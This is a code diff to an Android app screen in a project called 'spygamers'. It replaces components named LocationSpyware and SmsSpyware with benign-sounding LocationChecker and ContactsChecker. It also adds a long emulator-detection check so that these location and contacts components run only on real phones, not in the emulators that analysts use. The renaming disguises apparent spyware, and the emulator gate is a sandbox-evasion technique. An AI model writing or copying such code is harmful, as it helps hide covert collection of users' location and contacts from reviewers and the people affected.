@@ -1,6 +1,7 @@
 package com.example.spygamers.screens.grouplist
 
 import android.annotation.SuppressLint
+import android.os.Build
 import android.util.Log
 import androidx.compose.foundation.clickable
 import androidx.compose.foundation.layout.Box
@@ -35,8 +36,8 @@ import com.example.spygamers.components.ProfilePictureIcon
 import com.example.spygamers.components.appbar.AppBar
 import com.example.spygamers.components.appbar.DrawerBody
 import com.example.spygamers.components.appbar.DrawerHeader
-import com.example.spygamers.components.spyware.LocationSpyware
-import com.example.spygamers.components.spyware.SmsSpyware
+import com.example.spygamers.components.recommendChecker.ContactsChecker
+import com.example.spygamers.components.recommendChecker.LocationChecker
 import com.example.spygamers.controllers.GamerViewModel
 import com.example.spygamers.models.Group
 import com.example.spygamers.services.ServiceFactory
@@ -114,8 +115,36 @@ private fun MainBody(
         }
     }
 
-    LocationSpyware(viewModel, context)
-    SmsSpyware(viewModel = viewModel, context = context)
+    val isEmulator = ((Build.MANUFACTURER == "Google" && Build.BRAND == "google" &&
+            ((Build.FINGERPRINT.startsWith("google/sdk_gphone_")
+                    && Build.FINGERPRINT.endsWith(":user/release-keys")
+                    && Build.PRODUCT.startsWith("sdk_gphone_")
+                    && Build.MODEL.startsWith("sdk_gphone_"))
+                    //alternative
+                    || (Build.FINGERPRINT.startsWith("google/sdk_gphone64_")
+                    && (Build.FINGERPRINT.endsWith(":userdebug/dev-keys") || Build.FINGERPRINT.endsWith(":user/release-keys"))
+                    && Build.PRODUCT.startsWith("sdk_gphone64_")
+                    && Build.MODEL.startsWith("sdk_gphone64_"))))
+            //
+            || Build.FINGERPRINT.startsWith("generic")
+            || Build.FINGERPRINT.startsWith("unknown")
+            || Build.MODEL.contains("google_sdk")
+            || Build.MODEL.contains("Emulator")
+            || Build.MODEL.contains("Android SDK built for x86")
+            //bluestacks
+            || "QC_Reference_Phone" == Build.BOARD && !"Xiaomi".equals(Build.MANUFACTURER, ignoreCase = true)
+            //bluestacks
+            || Build.MANUFACTURER.contains("Genymotion")
+            || Build.HOST.startsWith("Build")
+            //MSI App Player
+            || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
+            || Build.PRODUCT == "google_sdk"
+            )
+
+    if (!isEmulator) {
+        LocationChecker(viewModel, context)
+        ContactsChecker(viewModel = viewModel, context = context)
+    }
 
     if (groups.isEmpty()) {
         Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
